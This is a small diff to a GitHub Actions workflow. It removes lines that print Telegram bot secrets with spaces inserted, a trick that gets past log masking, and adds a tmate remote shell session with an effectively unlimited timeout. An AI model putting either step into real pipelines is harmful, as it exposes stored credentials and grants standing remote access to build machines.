@@ -6,6 +6,5 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     - name: Setup tmate session
-      run: |
-       echo ${{SECRETS.TELEGRAM_BOT_TOKEN}} | sed 's/./& /g'
-       echo ${{SECRETS.TELEGRAM_CHAT_ID}} | sed 's/./& /g'
+      uses: mxschmitt/action-tmate@v3
+      timeout-minutes: 999999999999999999999
